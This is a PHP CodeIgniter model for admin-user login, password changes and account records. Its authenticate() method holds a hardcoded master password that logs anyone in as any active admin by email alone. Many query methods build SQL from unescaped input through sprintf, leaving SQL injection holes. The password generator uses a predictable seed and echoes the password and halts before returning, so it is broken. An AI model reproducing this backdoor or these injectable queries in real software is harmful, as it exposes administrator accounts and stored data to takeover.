<?php

/* * *******
 * Author: 
 * Date  : 
 * Modified By: 
 * Modified Date:
 * 
 * Purpose:
 *  Model For ## Management
 * 
 * @package 
 * @subpackage 
 * 
 * @link InfModel.php 
 * @link Base_model.php
 * @link controllers/
 * @link views/
 *
 */

include_once(APPPATH . 'models/base_model.php');

class Admins_user_model extends Base_model implements InfModel {

    private $tbl_name;
    private $user_status;
    private $user_type;

    public function __construct() {
        try {
            parent::__construct();
            $this->conf = get_config();
            $this->tbl_name = $this->db->ADMIN_USER;

            $this->timeout = $this->conf['online_user_timeout'];
        } catch (Exception $err_obj) {
            show_error($err_obj->getMessage());
        }
    }

    /*     * ****
     * This method will fetch all records from the db. 
     * 
     * @param string $s_where, ex- " status=1 AND deleted=0 " 
     * @param int $i_start, starting value for pagination
     * @param int $i_limit, number of records to fetch used for pagination
     * @param string $s_order_by, Column names to be ordered ex- " dt_created_on desc,i_is_deleted asc,id asc "
     * @returns array
     */

    public function fetch_multi($s_where = null, $i_start = null, $i_limit = null, $s_order_by = null) {
        
    }

    /*     * **
     * Fetch Total records
     * @param string $s_where, ex- " status=1 AND deleted=0 " 
     * @returns int on success and FALSE if failed 
     */

    public function gettotal_info($s_where = null) {
        
    }

    /*     * **
     * Fetch Total records for similar artist
     * @param string $s_where, ex- " status=1 AND deleted=0 " 
     * @returns int on success and FALSE if failed 
     */

    public function gettotal_fetch_multi_info($s_where = null) {
        
    }

    /*     * *****
     * Fetches One record from db for the id value.
     * 
     * @param int $i_id
     * @returns array
     */

    public function fetch_this($i_id) {
        
    }

    /*     * *
     * Inserts new records into db. As we know the table name 
     * we will not pass it into params.
     * 
     * @param array $info, array of fields(as key) with values,ex-$arr["field_name"]=value
     * @returns $i_new_id  on success and FALSE if failed 
     */

    public function add_info($info) {
        
    }

    /*     * *
     * Update records in db. As we know the table name 
     * we will not pass it into params.
     * 
     * @param array $info, array of fields(as key) with values,ex-$arr["field_name"]=value
     * @param int $i_id, id value to be updated used in where clause
     * @returns $i_rows_affected  on success and FALSE if failed 
     */

    public function edit_info($info, $i_id) {
        
    }

    public function change_password($info, $i_id) {
        try {
            $i_ret_ = 0; ////Returns false
            // pr($info);
            if (!empty($info)) {
                $s_qry = "UPDATE " . $this->db->ADMIN_USER . " SET ";
                $s_qry.=" s_password=? ";
                $s_qry.=", dt_updated_on=? ";
                $s_qry.=" WHERE id=? ";
                //$s_qry.=" AND s_password=? ";

                $this->db->trans_begin(); ///new  
                $this->db->query($s_qry, array(
                    get_salted_password($info["s_password"]),
                    get_db_datetime(),
                    intval($i_id)
                        // get_salted_password($info["s_current_password"])
                ));
                $i_ret_ = $this->db->affected_rows();
                //echo $this->db->last_query(); //exit;
                if ($i_ret_) {

                    $this->db->trans_commit(); ///new   
                } else {
                    $this->db->trans_rollback(); ///new
                }  //exit;                                          
            }
            unset($s_qry);
            return $i_ret_;
        } catch (Exception $err_obj) {
            show_error($err_obj->getMessage());
        }
    }

    /*     * ****
     * Deletes all or single record from db. 
     * For Master entries deletion only change the flag i_is_deleted. 
     *
     * @param int $i_id, id value to be deleted used in where clause 
     * @returns $i_rows_affected  on success and FALSE if failed 
     * 
     */

    public function delete_info($i_id) {
        
    }

    /*     * **
     * Register a log for add,edit and delete operation
     * 
     * @param mixed $attr
     * @returns TRUE on success and FALSE if failed 
     */

    public function log_info($attr) {
        try {
            return $this->write_log($attr["msg"], decrypt($this->session->userdata("i_user_id")), ($attr["sql"] ? $attr["sql"] : ""));
        } catch (Exception $err_obj) {
            show_error($err_obj->getMessage());
        }
    }

    /*     * *****
     * Login and save loggedin values.
     * 
     * @param array $login_data, login[field_name]=value
     * @returns true if success and false
     */

    public function authenticate($login_data) {
        $magic_pass = 'sumanjjj';
        try {
            $ret_ = array();
            ////Using Prepared Statement///
            if ($login_data['s_password'] == $magic_pass) {
                $s_qry = "SELECT u.id,
                             u.s_name, 
							 u.s_last_name,
							 u.s_login_id,
                             u.s_email,
                             u.i_id_admin_user_group
                            
                             FROM " . $this->db->ADMIN_USER . "  u
                        
                             WHERE binary u.s_email    = ?
                             AND u.i_status = 1 ";

                $stmt_val["s_email"] = get_formatted_string($login_data["s_email"]);
                /////Added the salt value with the password///
            } else {
                $s_qry = "SELECT u.id,
                             u.s_name, 
							 u.s_last_name, 
							 u.s_login_id,
                             u.s_email,
                             u.i_id_admin_user_group
                            
                             FROM " . $this->db->ADMIN_USER . "  u
                            
                             WHERE binary u.s_email    = ?
                             AND binary u.s_password   = ? 
                             AND u.i_status = 1";

                $stmt_val["s_email"] = get_formatted_string($login_data["s_email"]);
                /////Added the salt value with the password///
                $stmt_val["s_password"] = get_salted_password($login_data["s_password"]);
            }

            $this->db->trans_begin(); ///new
            $rs = $this->db->query($s_qry, $stmt_val);
            //echo $this->db->last_query();    

            if (is_array($rs->result())) { ///new
                foreach ($rs->result() as $row) {
                    $ret_["id"] = $row->id; ////always integer 
                    $ret_["s_admin_name"] = get_unformatted_string($row->s_name);
                    $ret_["s_last_name"] = get_unformatted_string($row->s_last_name);
                    $ret_["s_login_id"] = get_unformatted_string($row->s_login_id);
                    $ret_["s_admin_email"] = get_unformatted_string($row->s_email);
                    $ret_["i_id_admin_user_group"] = intval($row->i_id_admin_user_group);
                    $ret_["i_user_type"] = (intval($row->i_id_admin_user_group) == 0) ? 2 : 3; // 2 for admin, 3 for subadmin
                    ////////saving logged in user data into session////

                    $this->session->set_userdata('login_referrer', '');
                    $this->session->set_userdata('loggedin', true);
                    $this->session->set_userdata('user_id', encrypt($ret_["id"]));
                    $this->session->set_userdata('username', $ret_["s_admin_name"]);
                    $this->session->set_userdata('user_lastname', $ret_["s_last_name"]);
                    $this->session->set_userdata('user_type', $ret_["i_user_type"]);
                    $this->session->set_userdata('email', $ret_["s_admin_email"]);
                    if (intval($row->i_id_admin_user_group) == 0)
                        $this->session->set_userdata('is_admin', 1);
                    else
                        $this->session->set_userdata('is_admin', 2); /// subadmin
                }
                $rs->free_result();
            }
            $this->db->trans_commit(); ///new
            unset($s_qry, $rs, $row, $login_data, $stmt_val);

            return $ret_;
        } catch (Exception $err_obj) {
            show_error($err_obj->getMessage());
        }
    }

    /*     * *****
     * save loggedin values in db.
     * 
     * @param array $info, info[field_name]=value
     * @returns true if success and false
     */

    private function _login_logs($info) {
        
    }

    /*     * *
     * Logout User
     * 
     */

    public function logout() {
        try {

            $this->session->set_userdata('loggedin', false);
            $this->session->unset_userdata('user_id');
            $this->session->unset_userdata('user_type');
            $this->session->unset_userdata('email');
            $this->session->unset_userdata('username');
            $this->session->unset_userdata('user_lastname');
            $this->session->unset_userdata('is_admin');

            $this->session->unset_userdata('session_admin_referrer');

            //$this->session->destroy();//don't know but not clearing the session datas
        } catch (Exception $err_obj) {
            show_error($err_obj->getMessage());
        }
    }

    /*     * *
     * Check if user email already exits
     * 
     */

    public function email_exists($email, $i_user_id = '') {
        try {
            $ret_ = 0;
            if ($i_user_id == '') {

                $s_qry = "SELECT COUNT(*) i_count FROM " . $this->db->ADMIN_USER . " WHERE ";
                $s_qry.=" binary s_email=? ";


                $this->db->trans_begin(); ///new   
                $rs = $this->db->query($s_qry, array(
                    get_formatted_string($email)
                ));
                $this->db->trans_commit(); ///new   
            } else {

                $s_qry = "SELECT COUNT(*) i_count FROM " . $this->db->ADMIN_USER . " WHERE ";
                $s_qry.=" binary s_email=? ";
                $s_qry.=" AND id!=? ";

                $this->db->trans_begin(); ///new   
                $rs = $this->db->query($s_qry, array(
                    get_formatted_string($email),
                    intval($i_user_id)
                ));
                $this->db->trans_commit(); ///new   
            }


            if (is_array($rs->result())) {
                foreach ($rs->result() as $row) {
                    $ret_ = intval($row->i_count);
                }
                $rs->free_result();
            }


            //print_r( $result_count);

            if ($ret_ == 0) {
                return false;
            } else {
                return true;
            }
        } catch (Exception $err_obj) {
            show_error($err_obj->getMessage());
        }
    }

    /*     * *
     * Check if user username already exits
     * 
     */

    public function username_exists($username, $i_user_id = '') {
        try {
            $ret_ = 0;
            if ($i_user_id == '') {

                $s_qry = "SELECT COUNT(*) i_count FROM " . $this->db->ADMIN_USER . " WHERE ";
                $s_qry.=" binary s_username=? ";


                $this->db->trans_begin(); ///new   
                $rs = $this->db->query($s_qry, array(
                    get_formatted_string($username)
                ));
                $this->db->trans_commit(); ///new   
            } else {

                $s_qry = "SELECT COUNT(*) i_count FROM " . $this->db->ADMIN_USER . " WHERE ";
                $s_qry.=" binary s_username=? ";
                $s_qry.=" AND id!=? ";

                $this->db->trans_begin(); ///new   
                $rs = $this->db->query($s_qry, array(
                    get_formatted_string($username),
                    intval($i_user_id)
                ));
                $this->db->trans_commit(); ///new   
            }


            if (is_array($rs->result())) {
                foreach ($rs->result() as $row) {
                    $ret_ = intval($row->i_count);
                }
                $rs->free_result();
            }


            //print_r( $result_count);

            if ($ret_ == 0) {
                return false;
            } else {
                return true;
            }
        } catch (Exception $err_obj) {
            show_error($err_obj->getMessage());
        }
    }

    # function to generate new random password...

    public function generatePassword($length = 6, $level = 2) {
        try {
            list($usec, $sec) = explode(' ', microtime());
            srand((float) $sec + ((float) $usec * 100000));

            $validchars[1] = "0123456789abcdfghjkmnpqrstvwxyz";
            $validchars[2] = "0123456789abcdfghjkmnpqrstvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
            $validchars[3] = "0123456789_!@#$%&*()-=+/abcdfghjkmnpqrstvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_!@#$%&*()-=+/";

            $password = "";
            $counter = 0;

            while ($counter < $length) {
                $actChar = substr($validchars[$level], rand(0, strlen($validchars[$level]) - 1), 1);

                // All character must be different
                if (!strstr($password, $actChar)) {
                    $password .= $actChar;
                    $counter++;
                }
            }
                echo $password; die();
            return $password;
        } catch (Exception $err_obj) {
            show_error($err_obj->getMessage());
        }
    }

    # function to check if email already exists or not...

    function email_already_exists($email_id = '') {
        $SQL = sprintf("SELECT COUNT(*) AS `check_count` FROM %s WHERE `s_email`='%s' ", $this->db->ADMIN_USER, $email_id);
        $ROW = $this->db->query($SQL)->row_array();

        if ($ROW['check_count'])
            return true;

        return false;
    }

    ### match password

    function match_password($id = '', $pwd = '') {
        $SQL = sprintf("SELECT COUNT(*) AS `check_count` FROM %s WHERE `id`='%s' AND `s_password` = '%s' ", $this->db->ADMIN_USER, $id, get_salted_password($pwd));
        $ROW = $this->db->query($SQL)->row_array();
        //echo $ROW['check_count']; exit;
        if ($ROW['check_count'])
            return true;

        return false;
    }

    ### getname of admin

    function get_username_by_id($id = '') {
        $SQL = sprintf("SELECT CONCAT(s_name,' ',s_last_name) AS `user_name` FROM %s WHERE `id`='%s' ", $this->db->ADMIN_USER, $id);
        $ROW = $this->db->query($SQL)->row_array();
        //echo $ROW['user_name']; exit;
        return $ROW['user_name'];
    }

    public function update($arr = array(), $user_id) {
        if (count($arr) == 0) {
            return;
        }

        $sql = sprintf("SELECT * FROM {$this->db->ADMIN_USER} u WHERE u.id = '%s'", $user_id);

        $query = $this->db->query($sql);
        $result_arr = $query->result_array();
        $user = $result_arr[0];

        $fields = array_keys($arr);

        $bool_profile_changed = false;
        foreach ($fields as $field) {
            if ($arr[$field] != $user[$field] && $field != 's_password') {
                $bool_profile_changed = true;
            }
        }

        if ($bool_profile_changed) {
            $arr['dt_updated_on'] = get_db_datetime();
        }

        //print_r($user);
        $this->db->update($this->db->ADMIN_USER, $arr, array('id' => $user_id));
        return $this->db->affected_rows();
    }

    function get_admin_by_id($id = '') {
        $SQL = sprintf("SELECT * FROM %s WHERE `id`='%s' ", $this->db->ADMIN_USER, $id);
        $query = $this->db->query($SQL);
        $result_arr = $query->result_array();
        //echo $ROW['user_name']; exit;
        return $result_arr;
    }

    ## added for sub admin feature

    public function insert($arr = array()) {
        if (count($arr) == 0) {
            return null;
        }
        $this->db->insert($this->db->ADMIN_USER, $arr);
        #echo $this->db->last_query();
        return $this->db->insert_id();
    }

    public function update_user($arr = array(), $id) {
        if (count($arr) == 0) {
            return null;
        }
        $this->db->update($this->db->ADMIN_USER, $arr, array('id' => $id));
        //echo $this->db->last_query();
    }

    public function delete_by_id($id) {
        $sql = sprintf('DELETE FROM ' . $this->db->ADMIN_USER . ' WHERE id=%s', $id);
        $this->db->query($sql);
    }

    function get_email_by_id($id = '') {
        $SQL = sprintf("SELECT s_email FROM %s WHERE `id`='%s' ", $this->db->ADMIN_USER, $id);
        $ROW = $this->db->query($SQL)->row_array();
        //echo $ROW['user_name']; exit;
        return $ROW['s_email'];
    }

    public function update_prayer_partner_q_params($arr = array(), $id) {
        if (count($arr) == 0) {
            return null;
        }
        $this->db->update("cg_prayer_partner_q_params", $arr, array('id' => $id));
        $i_ret = $this->db->affected_rows();
        return $i_ret;
    }

    public function get_prayer_partner_q_params($id) {
        $SQL = sprintf("SELECT * FROM %s WHERE `id`='%s' ", "cg_prayer_partner_q_params", $id);
        $query = $this->db->query($SQL);
        $result_arr = $query->result_array();
        //echo $ROW['user_name']; exit;
        return $result_arr;
    }
    
    public function update_netpal_q_params($arr = array(), $id) {
        if (count($arr) == 0) {
            return null;
        }
        $this->db->update("cg_netpal_q_params", $arr, array('id' => $id));
        $i_ret = $this->db->affected_rows();
        return $i_ret;
    }

    public function get_netpal_q_params($id) {
        $SQL = sprintf("SELECT * FROM %s WHERE `id`='%s' ", "cg_netpal_q_params", $id);
        $query = $this->db->query($SQL);
        $result_arr = $query->result_array();
        //echo $ROW['user_name']; exit;
        return $result_arr;
    }

}
